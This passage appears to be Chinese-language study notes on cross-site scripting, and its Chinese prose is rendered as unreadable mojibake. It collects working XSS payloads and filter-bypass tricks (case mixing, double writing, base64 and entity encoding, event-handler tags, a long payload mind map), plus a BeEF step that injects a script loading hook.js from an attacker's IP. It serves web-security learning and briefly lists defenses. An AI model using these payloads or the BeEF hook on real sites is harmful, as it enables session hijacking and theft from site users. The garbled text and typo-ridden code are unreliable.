<li>‰ΩøÁî®window.location.hrefËé∑ÂèñÂΩìÂâçÈ°µÈù¢ÁöÑURLÔºåÂπ∂‰ΩøÁî®substr(1)ÂéªÈô§URL‰∏≠ÁöÑÁ¨¨‰∏Ä‰∏™Â≠óÁ¨¶ÔºàÈÄöÂ∏∏ÊòØ?Á¨¶Âè∑Ôºâ„ÄÇ</li>
<li>‰ΩøÁî®match(reg)ÊñπÊ≥ïÂØπURLËøõË°åÊ≠£ÂàôÂåπÈÖçÔºåÂ∞ÜÂåπÈÖçÁªìÊûúÂ≠òÂÇ®Âú®ÂèòÈáèr‰∏≠„ÄÇ</li>
<li>Â¶ÇÊûúÂåπÈÖçÁªìÊûúr‰∏ç‰∏∫nullÔºåÂàô‰ΩøÁî®unescape(r[2])Ëß£Á†ÅÂèÇÊï∞ÂÄºÔºåÂπ∂Â∞ÜÂÖ∂ËøîÂõû„ÄÇ</li>
<li>Â¶ÇÊûúÂåπÈÖçÁªìÊûú‰∏∫nullÔºåÂàôËøîÂõûnull„ÄÇ<br>
payload:<code>welcome.php?username=&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
</ol>
<p>‰æã2Ôºö</p>
<pre><code class="language-PHP">&lt;! DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;

&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;title&gt;redirect&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;/body&gt;
&lt;script&gt;
    var getUrlParam = function(name){
    //‰ΩøÁî®getUrlParam ÊñπÊ≥ïÔºå‰ªéURL‰∏≠Âèñ‰∫ÜÂêç‰∏∫usernameÁöÑÂèÇÊï∞
        var reg = new RegExp(&quot;(^|&amp;|#)&quot;+name+&quot;=([^&amp;]*)(&amp;|$)&quot;);
        var r = window.location.search.substr(1).match(reg);
        if (r != null ) return unescape(r[2]);
        return null;
    }
    //‰ªéURL‰∏≠Âèñ‰∫ÜÂêç‰∏∫redirectURLÁöÑÂèÇÊï∞
    loaction.href=getUrlParam(&quot;redirectURL&quot;);

&lt;/script&gt;
&lt;/html&gt;
</code></pre>
<p>‰ΩøÁî®javascript‰º™ÂçèËÆÆËøõË°åxssÊîªÂáª<br>
<strong>payload</strong>: <code>?redirectURL=javascript:alert(1)</code><br>
‰æã3Ôºö</p>
<pre><code class="language-PHP">&lt;! DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;

&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;title&gt;postMessage&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;/body&gt;
&lt;script&gt;

    if (window.postMessage){

        window.addEventListener(&quot;message&quot;,function(e){
            eval(e.data);
    });
    }

&lt;/script&gt;
&lt;/html&gt;
</code></pre>
<ol>
<li>‰ΩøÁî®Êù°‰ª∂ËØ≠Âè•if (window.postMessage)Ê£ÄÊü•window.postMessageÊòØÂê¶Â≠òÂú®ÔºåÂç≥ÊµèËßàÂô®ÊòØÂê¶ÊîØÊåÅËØ•ÊñπÊ≥ï„ÄÇ</li>
<li>Â¶ÇÊûúÊîØÊåÅÔºåÂàôÈÄöËøáwindow.addEventListenerÊñπÊ≥ïÁªôÂΩìÂâçÁ™óÂè£Ê∑ªÂä†‰∏Ä‰∏™message‰∫ã‰ª∂ÁõëÂê¨Âô®„ÄÇ</li>
<li>Âú®‰∫ã‰ª∂ÁõëÂê¨Âô®ÁöÑÂõûË∞ÉÂáΩÊï∞‰∏≠Ôºå‰ΩøÁî®eval(e.data)ÂØπÊé•Êî∂Âà∞ÁöÑÊ∂àÊÅØËøõË°åÊ±ÇÂÄºÔºàÊâßË°åÔºâ„ÄÇeÊòØ‰∫ã‰ª∂ÂØπË±°Ôºåe.dataË°®Á§∫Êé•Êî∂Âà∞ÁöÑÊ∂àÊÅØÂÜÖÂÆπ„ÄÇ<br>
payloadÔºö</li>
</ol>
<pre><code class="language-PHP">&lt;! DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;

&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;title&gt;postMessage payload&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;iframe src=&quot;http://www.xxx.com/1.php&quot;&gt; onload=&quot;xss()&quot;&lt;/iframe&gt;
&lt;/body&gt;

&lt;script&gt;
    function xss(){
    window[0].postMassage(&quot;alert(1)&quot;,&quot;*&quot;)
    }
&lt;/script&gt;
</code></pre>
<ol>
<li>Âú®<code>&lt;body&gt;</code>Ê†áÁ≠æÂÜÖÔºåÊúâ‰∏Ä‰∏™<code>&lt;iframe&gt;</code>ÂÖÉÁ¥†ÔºåÂÖ∂srcÂ±ûÊÄßÊåáÂêë<code>http://www.xxx.com/1.php </code>ÁΩëÂùÄ„ÄÇÂú®<code>&lt;iframe&gt;</code>Ê†áÁ≠æ‰∏äÊúâ‰∏Ä‰∏™onload‰∫ã‰ª∂Â§ÑÁêÜÁ®ãÂ∫èÔºåÂΩì<code>&lt;iframe&gt;</code>Âä†ËΩΩÂÆåÊàêÂêéÔºå‰ºöË∞ÉÁî®ÂáΩÊï∞xss()„ÄÇ</li>
<li>Âú®<code>&lt;script&gt;</code>Ê†áÁ≠æ‰∏≠ÂÆö‰πâ‰∫ÜÂáΩÊï∞xss()„ÄÇ</li>
<li>Âú®ÂáΩÊï∞xss()‰∏≠Ôºå‰ΩøÁî®window[0].postMessage(&quot;alert(1)&quot;, &quot;*&quot;)Â∞ùËØïÂêëÊåáÂÆöÁöÑÁ™óÂè£ÂèëÈÄÅ‰∏ÄÊù°Ê∂àÊÅØ„ÄÇ</li>
<li>postMessage()ÊñπÊ≥ïÁî®‰∫éÂú®Ë∑®Á™óÂè£ÈÄö‰ø°‰∏≠ÂèëÈÄÅÊ∂àÊÅØ„ÄÇÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞ÊòØË¶ÅÂèëÈÄÅÁöÑÊ∂àÊÅØÂÜÖÂÆπÔºåËøôÈáåÊòØ&quot;alert(1)&quot;ÔºåË°®Á§∫Ë¶ÅÂºπÂá∫‰∏Ä‰∏™Ë≠¶Á§∫Ê°Ü„ÄÇÁ¨¨‰∫å‰∏™ÂèÇÊï∞&quot;<em>&quot;Ë°®Á§∫Ê∂àÊÅØÊé•Êî∂ÊñπÁöÑÁõÆÊ†áÊ∫êÔºåËøôÈáåÊòØÈÄöÈÖçÁ¨¶</em>ÔºåË°®Á§∫ÂèØ‰ª•‰∏é‰ªª‰ΩïÊ∫êËøõË°åÈÄö‰ø°<br>
‰æã4Ôºö</li>
</ol>
<pre><code class="language-PHP">&lt;html lang=&quot;en&quot;&gt;

&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;title&gt;window.name&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;/body&gt;
&lt;script&gt;

document.write(&quot;this window.name is:&quot;+ window.name);
// Áõ¥Êé•ËÆ≤window.nameËæìÂá∫Âà∞È°µÈù¢Ôºå Ôºàwindow.nameÂú®ËµãÂÄºÊó∂ ‰ºöËá™Âä®ËøõË°åtoString,Âπ∂‰∏îÂèØ‰ª•Áî®‰∫éË∑®ÂüüÈÄö‰ø°Ôºâ
&lt;/script&gt;
&lt;/html&gt;
</code></pre>
<p>payload</p>
<pre><code class="language-PHP">&lt;! DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;

&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;title&gt;window.name payload&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;iframe src=&quot;http://www.xxx.com/1.php&quot;&gt; name=&quot;&lt;img src=x onerror=alert(1)&gt;&quot;&lt;/iframe&gt;
&lt;/body&gt;
</code></pre>
<h2 id="xssÁöÑÁªïËøáÊñπÂºè">XssÁöÑÁªïËøáÊñπÂºè</h2>
<p>###Â§ßÂ∞èÂÜôÁªïËøá<br>
ÈíàÂØπÊüê‰∫õÈªëÂêçÂçïÔºåÊ≤°ÊúâÂ∞ÜËæìÂÖ•ÁöÑÂèÇÊï∞ËΩ¨Âèò‰∏∫Â∞èÂÜô‰∫ßÁîüËøô‰∏™ÊºèÊ¥û</p>
<p><strong>payload</strong>:<br>
<code>&lt;scRIpT&gt;alErt(1)&lt;/ScrIpT&gt;</code></p>
<h3 id="ÂèåÂÜôÁªïËøá">ÂèåÂÜôÁªïËøá</h3>
<p>ÈíàÂØπÂ∞ÜÊàë‰ª¨ÁöÑÊïèÊÑüÊ†áÁ≠æÊõøÊç¢‰∏∫Á©∫Ôºå‰ΩÜÊòØÊú™Âä†Âæ™ÁéØÈ™åËØÅÂØºËá¥</p>
<p><strong>payload</strong>:<br>
<code>&lt;scr&lt;script&gt;ipt&gt;aleralert(1)t(1)&lt;/scr&lt;/script&gt;ipt&gt;</code><br>
ÊàñËÄÖÔºö<br>
<code>&lt;scr&lt;--that--&gt;ipt&gt;</code></p>
<p>Á¨¨‰∫åÁßçÂà©Áî®Ê≥®ÈáäÁ¨¶Â∞Ü‰∏≠Èó¥ÁΩÆÁ©∫</p>
<h3 id="ÁºñÁ†ÅËΩ¨‰πâ">ÁºñÁ†ÅËΩ¨‰πâ</h3>
<p>ËøôÈáåÂèØ‰ª•Âà©Áî®ÁºñÁ†ÅÂä†ÂØÜÁªïËøá‰∏Ä‰∫õÂÖ≥ÈîÆËØçÈªëÂêçÂçïÁöÑËøáÊª§</p>
<p>payloadÔºö<br>
<code>&lt;script&gt;eavl(atob(&quot;PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==&quot;));&lt;/script&gt; </code></p>
<ul>
<li>eval()Áî®‰∫éÂ∞ÜÂ≠óÁ¨¶‰∏≤ÂΩì‰ΩúÁ®ãÂ∫èÊâßË°åÔºåatob()Áî®‰∫éËß£ÂØÜbase6</li>
</ul>
<p><code>&lt;a href=&quot;data:text/html;base64&quot;,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==&quot;&gt;1&lt;/a&gt;</code></p>
<p>Èô§‰∫Übase64ÔºåÊàë‰ª¨‰πüÂèØ‰ª•ÈÄöËøáurlÂ§öÊ¨°ÁºñÁ†ÅÊù•ÁªïËøáÔºåËøôÈáåÂ∞±‰∏çÂÅöÊºîÁ§∫„ÄÇ</p>
<h3 id="ÂÆû‰ΩìÁºñÁ†ÅÁªïËøá">ÂÆû‰ΩìÁºñÁ†ÅÁªïËøá</h3>
<p>ËøôÈáåÂÖ∂ÂÆûÂ∞±ÊòØÂà©Áî®<code>&lt;svg&gt;</code>Ê†áÁ≠æÂ∞ÜÂêéÈù¢ÁºñÁ†ÅÂêéÁöÑÂ≠óÁ¨¶ËøòÂéü</p>
<p><strong>payload</strong>:<br>
<code>&lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;</code></p>
<p>ÂÆû‰ΩìÁºñÁ†ÅËΩ¨Êç¢Â∞±ÊòØÂ∞ÜasciiÁºñÁ†ÅËΩ¨unicode<br>
<strong>Â∏∏Áî®ÂÆû‰ΩìÁºñÁ†Å</strong></p>
<pre><code class="language-html">Á©∫Ê†º  &amp;nbsp;            &amp;#160;    &amp;#x20;
&lt;    &amp;lt;              &amp;#60;      &amp;#x3c;
&gt;    &amp;gt;              &amp;#62;      &amp;#x3e;
&amp;    &amp;amp;             &amp;#38;      &amp;#x26;
&quot;    &amp;quot;            &amp;#34;      &amp;#x22;
'    &amp;apos; (IE‰∏çÊîØÊåÅ)  &amp;#39;      &amp;#x27;
:   &amp;#58;
(   &amp;#40;
)   &amp;#41;
</code></pre>
<p><strong>Â∏∏Áî®ÁºñÁ†ÅÊü•ËØ¢ÁΩëÁ´ô</strong><br>
<code>https://symbl.cc/cn/collections/punctuation-marks/</code></p>
<h3 id="Âπ≥ÊõøÁ¨¶Âè∑ÁªïËøá">Âπ≥ÊõøÁ¨¶Âè∑ÁªïËøá</h3>
<p>ÂÖ∂ÂÆûÂ∞±ÊòØ‰∏Ä‰∫õÁ¨¶Âè∑Ë¢´ËøáÊª§ÔºåÊàë‰ª¨‰ΩøÁî®‰∏Ä‰∫õÂèØ‰ª•‰∫ßÁîüÂêåÊ†∑ÊïàÊûúÁöÑÁ¨¶Âè∑ËøõË°åÊõøÊç¢„ÄÇ</p>
<blockquote>
<p>Áî®/‰ª£ÊõøÁ©∫Ê†º<br>
Áî®ÂèçÂºïÂè∑‰ª£ÊõøÊã¨Âè∑„ÄÅÂèåÂºïÂè∑<br>
Áî®throw‰ª£ÊõøÊã¨Âè∑<br>
Áî®htmlÂÆû‰ΩìÁºñÁ†Å:‰ª£ÊõøÂÜíÂè∑<br>
Áî®jsfuckÁºñÁ†ÅÁªïËøáÂ§ßÈÉ®ÂàÜÂ≠óÁ¨¶ËøáÊª§<br>
Áî®ÂèçÂçïÂºïÂè∑‰ª£ÊõøÔºàÔºâ<br>
ÂåÖÊã¨Áî®--&gt;Ê≥®ÈáäÁ¨¶Êù•ÊääÊó†Ê≥ïÈó≠ÂêàÁöÑÊ≥®ÈáäÊéâ</p>
</blockquote>
<h3 id="Á¨¶Âè∑Ë¢´ÁºñÁ†Å">Á¨¶Âè∑Ë¢´ÁºñÁ†Å</h3>
<p>ËøôÈáåÁ¨¶Âè∑Ë¢´ÂÆû‰ΩìÁºñÁ†ÅÔºå‰ΩÜÊòØÊú¨Ë∫´Èó≠ÂêàÁöÑÁ¨¶Âè∑ËøòÊúâ=ÂèØ‰ª•Áî®<br>
Âú®inputÊ†áÁ≠æ‰∏≠ÂèØ‰ª•‰ΩøÁî®onclickÊù•Ëß¶Âèë<br>
<code>x&quot; onclick=alert(1) //</code></p>
<h3 id="ÂÖ∂‰ªñÈùûÈªëÂêçÂçïÂèØÁî®Ê†áÁ≠æ">ÂÖ∂‰ªñÈùûÈªëÂêçÂçïÂèØÁî®Ê†áÁ≠æ</h3>
<pre><code class="language-PHP">&lt;img src=1 ŒønerrŒør=alert(&quot;xss&quot;);&gt;
&lt;input onfocus=&quot;alert('xss');&quot;&gt;
&lt;input Œønblur=alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt; #Á´û‰∫âÁÑ¶ÁÇπÔºåËß¶Âèëonblur‰∫ã‰ª∂
&lt;input onfocus=&quot;alert('xss');&quot; autofocus&gt; #ÈÄöËøáautofocusÂ±ûÊÄßÊâßË°åÊú¨Ë∫´ÁöÑfocus‰∫ã‰ª∂
&lt;details ontoggle=&quot;alert('xss');&quot;&gt;
&lt;details open ontoggle=&quot;alert('xss');&quot;&gt; #‰ΩøÁî®openÂ±ûÊÄßËß¶Âèëontoggle‰∫ã‰ª∂
&lt;svg ŒønlŒøad=alert(&quot;xss&quot;);&gt;
&lt;iframe ŒønlŒøad=alert(&quot;xss&quot;);&gt;&lt;/iframe&gt;
&lt;body/ŒønlŒøad=alert(&quot;xss&quot;);&gt;
</code></pre>
<h1 id="ÊºèÊ¥ûÊåñÊéò">ÊºèÊ¥ûÊåñÊéò</h1>
<h2 id="Â∏∏ËßÅÊÄùË∑Ø">Â∏∏ËßÅÊÄùË∑Ø</h2>
<ul>
<li>XSS</li>
<li>ÂàÜÁ±ª
<ul>
<li>ÂèçÂ∞ÑÂûãXSS</li>
<li>Â≠òÂÇ®ÂûãXSS</li>
<li>DOM XSS</li>
</ul>
</li>
<li>ÊåñÊéòÊÄùË∑ØÔºàÊúâÊ°ÜÂøÖÊèíÔºâ
<ul>
<li>Á¨¨‰∏ÄÊ≠•ÔºöÂØªÊâæÊèíÂÖ•ÁÇπ
<ul>
<li>ÂèçÂ∞ÑÂûãÔºö‰∏çË∑üÂêéÁ´ØÊï∞ÊçÆ‰∫ßÁîü‰∫§‰∫íÁöÑÁÇπ</li>
<li>Â≠òÂÇ®ÂûãÔºöË∑üÂêéÁ´ØÊï∞ÊçÆÂ∫ì‰∫ßÁîü‰∫§‰∫íÁöÑÁÇπ</li>
<li>DOM XSS
<ul>
<li>È°µÈù¢ÈáçÂÆöÂêë</li>
<li>ÂèñÂÄºÂÜôÂÖ•È°µÈù¢ÊàñÂä®ÊÄÅÊâßË°å</li>
<li>‰ΩøÁî®Â≠òÂú®ÁöÑÁº∫Èô∑ÁöÑÁ¨¨‰∏âÊñπÂ∫ìÊàñÈÄöÁî®ÁªÑ‰ª∂</li>
</ul>
</li>
</ul>
</li>
<li>Á¨¨‰∫åÊ≠•ÔºöÊµãËØïÊ≥®ÂÖ•ÁÇπÊèê‰∫§ÁöÑÂÜÖÂÆπÊòØÂê¶ÂèØ‰ª•Ê≥®ÂÖ•Âà∞È°µÈù¢</li>
<li>Âà§Êñ≠ÊòØÂê¶Âá∫Áé∞ËøáÊª§Ë°å‰∏∫ÔºàÊ®°Á≥äÊµãËØïÔºâ</li>
<li>Á¨¨ÂõõÊ≠•ÔºöÊ†πÊçÆÊ≥®ÂÖ•ÁÇπÂÜÖÂÆπÊâÄÂú®ÁΩëÈ°µ‰ΩçÁΩÆÈÉ®ÂàÜÁöÑDOM ÁªìÊûÑÊûÑÈÄ†PayloadËøõË°åÊµãËØï</li>
</ul>
</li>
<li>Â∏∏ËßÅÊºèÊ¥ûÁÇπ
<ul>
<li>Êó•ÂøóÂ§Ñ</li>
<li>ËÆ¢ÂçïÂ§Ñ</li>
<li>ÊñáÁ´†Â§Ñ</li>
<li>ÂõæÁâá‰∏ä‰º†Â§Ñ</li>
<li>ÁïôË®ÄÂ§Ñ</li>
<li>ËÅäÂ§©ÂÆ§</li>
<li>ËØ∑Ê±ÇÂ§¥Â§Ñ</li>
<li>‰ΩúÂìÅÂ§Ñ</li>
<li>ÂèçÈ¶àÂ§Ñ</li>
<li>ÂèëÂ∏ñÂ§Ñ</li>
<li>ËµÑÊñôÂ§Ñ</li>
<li>Ê®°ÊùøÂ§Ñ</li>
</ul>
</li>
</ul>
<p><strong>Â∑•ÂÖ∑Êé®Ëçê</strong><br>
<code>https://github.com/xmoct/FxxkXSS</code></p>
<h2 id="Ê°à‰æãÂàÜÊûê">Ê°à‰æãÂàÜÊûê</h2>
<h3 id="url‰∏≠ÁöÑxss">url‰∏≠ÁöÑxss</h3>
<ol>
<li>ÂÄº‰∏∫1Êó∂ È°µÈù¢‰∏çÂ≠òÂú®</li>
<li>ÂÄº‰∏∫payloadÔºö<code>&lt;script&gt;alert('url')&lt;/script&gt;</code>Êó∂ÔºåÂºπÊ°Ü</li>
</ol>
<h3 id="ÁïôË®ÄÂ§Ñ">ÁïôË®ÄÂ§Ñ</h3>
<ol>
<li>ËæìÂÖ•payload: xss#<code>&lt;img src=1 onerror=alert('s')&gt;</code> //ÂèØËÉΩ‰∏ç‰ºö</li>
<li>ËæìÂÖ•payload: xss#<code>&lt;img src=1 onerror=alert(1)&gt;</code> //ÂºπÁ™ó,document.domain</li>
<li>ÂºπÁ™ó</li>
</ol>
<h3 id="Êñá‰ª∂‰∏ä‰º†">Êñá‰ª∂‰∏ä‰º†</h3>
<ol>
<li>‰∏ä‰º†Â§¥ÂÉè</li>
<li>ÊîπÊñá‰ª∂ÂêéÁºÄÂêç / Êîπcontent-typeÔºötext/html
<ul>
<li><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
</ul>
</li>
<li>ÂºπÁ™ó</li>
</ol>
<h2 id="icloud-drive">icloud Drive</h2>
<ol>
<li>Âú®iCloud Drive‰∏≠ÔºåÂèØ‰ª•‰∏ä‰º†Êñá‰ª∂Âπ∂Â∞Ü‰∏ä‰º†Êñá‰ª∂ÁßªÂä®Âà∞Êñá‰ª∂Â§π‰∏≠ÔºåËøô‰∫õÊñá‰ª∂ÂíåÊñá‰ª∂Â§πÂèØ‰ª•ÈÄöËøáÁîµÂ≠êÈÇÆ‰ª∂ÂíåicloudÂàÜ‰∫´ÁªôÂÖ∂‰ªñÁî®Êà∑</li>
<li>‰∏ä‰º†ÁöÑÊØè‰∏™Êñá‰ª∂Â§πÊàñÊñá‰ª∂ÈÉΩÊúâ‰∏Ä‰∏™ÂõæÊ†áÔºåÂèØ‰ª•Áõ¥Êé•ÁºñËæëËØ¶ÁªÜ‰ø°ÊÅØÂêçÁß∞</li>
</ol>
<ul>
<li><code>&lt;svg&gt;&lt;img src onerror=javasript&amp;#58;alert&amp;#40;1&amp;#41;&gt;</code></li>
<li><code>&lt;svg javasript&amp;#58;alert&amp;#40;2&amp;#41;&gt;</code></li>
</ul>
<pre><code class="language-html">:   &amp;#58;
(   &amp;#40;
)   &amp;#41;
</code></pre>
<ol>
<li>Êú™ËøáÊª§ html Ê†áÁ≠æÔºåËøôÈáåÂ≠òÂú® XSS ÊºèÊ¥û</li>
<li>ÊääÊñá‰ª∂ÂÖ±‰∫´ÁªôÂèóÂÆ≥ËÄÖÔºåÂèóÂÆ≥ËÄÖÊâìÂºÄÂ∞èÁ™óÂè£Êó∂ÔºåÊâç‰ºöÂèóÂà∞ XSS ÁöÑÊîªÂáª</li>
<li>Ôºà2021Âπ¥ÁöÑÊ¥ûÔºâÊúÄÁªàÊîØ‰ªò‰∫Ü9000$ÔºàÂàáËÆ∞ÔºåÊúâÊ°ÜÔºåÊúâÂõûÊòæÔºåÂ∞±ËØïÁùÄx‰∏ÄxÔºâ</li>
</ol>
<h2 id="Áî®Êà∑Ê≥®ÂÜå">Áî®Êà∑Ê≥®ÂÜå</h2>
<ol>
<li>Ê≥®ÂÜå‰ø°ÊÅØÂ°´xss</li>
<li>Âà´‰∫∫ËÆøÈóÆ‰Ω†‰ø°ÊÅØÊó∂Â∞±‰ºöËß¶Âèë</li>
</ol>
<h3 id="Âç±ÂÆ≥"><strong>Âç±ÂÆ≥</strong></h3>
<blockquote>
<p>ÁõóÂèñcookie<br>
Ê§çÂÖ•ÈîÆÁõòËÆ∞ÂΩïÂô®„ÄÇ<br>
ÊîªÂáªÂèóÂÆ≥ËÄÖÊâÄÂú®ÁöÑÂ±ÄÂüüÁΩë„ÄÇ<br>
‰ª£ÁêÜËΩ¨ÂèëÊµÅÁªèË¢´ÊîªÂáªËÄÖÁöÑÊâÄÊúâ Web ÊµÅÈáèÔºåÂç≥ÂÆûÊñΩ‰∏≠Èó¥‰∫∫ÊîªÂáª„ÄÇ<br>
Á™ÉÂèñÊàñÁØ°ÊîπÂ∫îÁî® cookie Áî®‰∫é‰ºöËØùÂä´ÊåÅ„ÄÇ<br>
Êõ¥ÊîπË¢´ÊîªÂáªËÄÖ Web Â∫îÁî®ÁöÑÊòæÁ§∫ÂÜÖÂÆπ„ÄÇ<br>
ÁªïËøá CSRF ÂÆâÂÖ®Èò≤Êä§Êé™ÊñΩ„ÄÇ<br>
ÂàõÂª∫ÂåÖÂê´ÊÅ∂ÊÑè JavaScript ‰ª£Á†ÅÁöÑËôöÂÅáÁΩëÁ´ô‰ª•ÂèäÂà∞ËØ•ÁΩëÁ´ôÈ°µÈù¢ÁöÑÈìæÊé•„ÄÇ<br>
ÂèëÈÄÅÂµåÂÖ•ÊÅ∂ÊÑè Web URL ÁöÑÁîµÂ≠êÈÇÆ‰ª∂„ÄÇ<br>
‰ΩøÁî® URL Áü≠Á†ÅÈöêËîΩÁúüÂÆû URL„ÄÇ</p>
</blockquote>
<h3 id="ÊºèÊ¥ûÈò≤Âæ°">ÊºèÊ¥ûÈò≤Âæ°</h3>
<ol>
<li>htmlÂõûÊòæÂÜÖÂÆπÂú®htmlÈ°µÈù¢Ê†áÁ≠æ‰πãÂ§ñÊó∂ÔºåÂÆû‰ΩìÂåñÂ∑¶Âè≥Â∞ñÊã¨Âè∑</li>
<li>htmlÂõûÊòæÂÜÖÂÆπÂú®<code>&lt;script&gt;</code>‰ª£Á†ÅÂø´Êó∂ÔºåÂÆû‰ΩìÂåñÂ∑¶Âè≥Â∞ñÊã¨Âè∑„ÄÅ‚Äú/‚Äù„ÄÅÂçïÂºïÂè∑Á≠âÂèØËÉΩÈó≠ÂêàÊ†áÁ≠æÁöÑÂ≠óÁ¨¶</li>
<li>htmlÂõûÊòæÂÜÖÂÆπÈÄöËøápostmessage‰Ωú‰∏∫ËæìÂÖ•ÁÇπÊó∂ Ê£ÄÊµãmessageEventÁöÑÊù•Ê∫êÊòØÂê¶Âú®ÁôΩÂêçÂçïÂÜÖÔºåÂêåÊó∂Ê£ÄÊµãÊù•Ê∫êÊï∞ÊçÆÊòØÂê¶ÂêàÊ≥ïÔºåÊòØÂê¶Â≠òÂú®ÊÅ∂ÊÑè‰ª£Á†Å</li>
</ol>
<h3 id="xss‰øÆÂ§çÊñπÊ°à">xss‰øÆÂ§çÊñπÊ°à</h3>
<p><strong>xss‰øÆÂ§çÊñπÊ°à</strong><br>
`https://zhuanlan.zhihu.com/p/262038810</p>
<!-- more -->
<!-- more -->
<h3 id="Â∑•ÂÖ∑">Â∑•ÂÖ∑</h3>
<p>Âú®Á∫øÁîüÊàêxss<br>
<code>http://xssor.io/#ende</code><br>
beef-xss</p>
<ol>
<li>ËæìÂÖ•Êñ∞ÂØÜÁ†Å<br>
<code>sudo beef-xss</code></li>
<li>ÁôªÂΩï<br>
beef:beef</li>
<li>ÊèíÂÖ•<code>&lt;script src=&quot;http://192.168.142.53:3000/(Ëá™Â∑±ÁöÑkaliIPÂú∞ÂùÄ):3000/hook.js&quot;&gt;&lt;/script&gt;</code></li>
<li>‰∏äÁ∫ø</li>
<li>ÊºèÊ¥ûÂà©Áî®</li>
</ol>
<h3 id="‰ªªÂä°">‰ªªÂä°</h3>
<ol>
<li>
<p>JavaScriptÁöÑ<mark>on‰∫ã‰ª∂</mark> Âπ∂ËøõË°åÊï¥ÁêÜ/ÂÆûÈ™å</p>
</li>
<li>
<p><strong>xssValidator‰ΩøÁî®</strong><br>
<code>https://www.freebuf.com/sectool/269231.html</code></p>
</li>
<li>
<p>‰∫ÜËß£beef-xssÂü∫Êú¨Áî®Ê≥ï</p>
</li>
<li>
<p>ÂÜôÈÄöÂÖ≥ÊñáÊ°£ÔºàÊÄùË∑Ø / ÈÅáÂà∞‰∫ÜÂì™‰∫õÈóÆÈ¢ò /ÊÄé‰πàËß£ÂÜ≥ÁöÑÔºâ<br>
<code>https://xss.tesla-space.com/</code><br>
Diango debug page xssÊºèÊ¥ûÔºàCVE-2017-12794ÔºâÔºàÁúãÊáÇ‰ª£Á†ÅÁöÑÂ∞±ÂÜô‰∏Ä‰ªΩÊä•Âëä / Áúã‰∏çÊáÇÁöÑÂ∞±ÊåâÁÖßÊµÅÁ®ãËµ∞‰∏ÄÈÅçÔºâ<br>
<code>https://vulhub.org/#/environments/django/CVE-2017-12794/</code><br>
Â∞ùËØïÊåñÊåñsrcÔºàÊúâÊ°ÜÂøÖ√óÔºâÔºà‰∏ä‰º†Êñá‰ª∂ÁöÑÂú∞Êñπ‰πüÂèØ‰ª•ËØïËØïÔºâ</p>
</li>
</ol>
<h2 id="xssËÑëÂõæ">xssËÑëÂõæ</h2>
<pre><code class="language-js">- xss
    - ÊåñÊéò
        - Ëß¶ÁÇπ
            - Origin
                - Inline-javascript
                    - alert`1`
                    - \u{61}l\u{65}rt`1` (IE 11)
                    - '-alert(1)'
                    - location=name
                    - setTimeout(location)
                    - gbk chatset: %bb\&quot;alert(1)
                    - `&amp;{alert(1)}`
                    - `&quot;&lt;!--&lt;script&gt;&quot;`
                - Attribute
                    - ÊôÆÈÄöÂ±ûÊÄß
                        - &quot;oncut=alert(1)
                        - &quot;autofocus/onfocus=alert(1)//
                        - &quot;onerror=alert(1)//
                    - ‰∫ã‰ª∂Â±ûÊÄß
                        - ‰ΩøÁî®HTMLÁºñÁ†ÅÈó≠ÂêàJS
                            - delFeedbak('&amp;apos;)alert(1)//')
                        - VBScript ÔºàIEÔºâ
                            - &lt;![if&lt;iframe/onload=vbs::alert[:]&gt;
                            - &lt;img language=vbs src=&lt;b onerror=alert#1/1#&gt;
                            - &lt;script language=vbs&gt;&lt;/script&gt;&lt;img src=xx:xonerror=''::alert+']'::''&gt;
                    - ÈìæÊé•Â±ûÊÄß
                        - JS URI
                            - URLÁºñÁ†Å
                                - javascript:alert%281%29
                            - Êó†Á¨¶Âè∑
                                - javascript:name
                                    -window.name
                        - DATA URI (Firefox)
                            - base64
                                - data:text/html;base64,PHNjcmlwdD5hbGvydCgxKtwvc2NyaxBOPg==
                            - Á©∫Ê†º
                                - data:text/html,&lt; sc r i p t&gt;alert(1)&lt;/sc r ip t&gt;
                            - Êó†ÊïàÁöÑ mime-type
                                - data:),&lt;script&gt;alert(1)&lt;/script&gt;
                            - Â∞è‰ºóÂ≠óÁ¨¶ÈõÜ
                        - VBS URI (IE)
                            - vbsscript:Msgbox+1
                    - style
                        - font-family:a/**/ression(alert(1))('\')exp\')
                    - HTML ÁºñÁ†Å
                        - ÂÆû‰ΩìÂëΩÂêçÁºñÁ†Å
                            - javascript&amp;colon;alert(1)
                            - &amp;newLine;javascript:alert(1)
                        - ÂçÅËøõÂà∂ÁºñÁ†Å
                            - java&amp;#000000000000000115;cript:loaction=name
                        - ÂçÅÂÖ≠ËøõÂà∂ÁºñÁ†Å
                            - java&amp;x000000000000000073;cript:location=name
                - HTML
                    - Ê†áÁ≠æ‰ºòÂÖàÁ∫ß
                        - {tag}&lt;img name=&quot;{/tag} onerror=alert({{i}})//&quot;&gt;
                    - ËæπÁïåÊ£ÄÊµã
                        - ÂèçÂºïÂè∑
                            - alt=``onload=alert(1)
                        - Á≠âÂè∑
                            - alt=
                        - ÂºïÂè∑
                            - alt='&quot;name='onerror=alert()//'
                            - style=xss:&quot;'/onclick=alert(1)//'
                            - &lt;a href=[0x0b]&quot; onclick=alert(1)//&quot;&gt;click&lt;/a&gt;
                        - ÂàÜÈöîÁ¨¶
                            - alt=&quot;&quot;[newLine]onclick=alert()
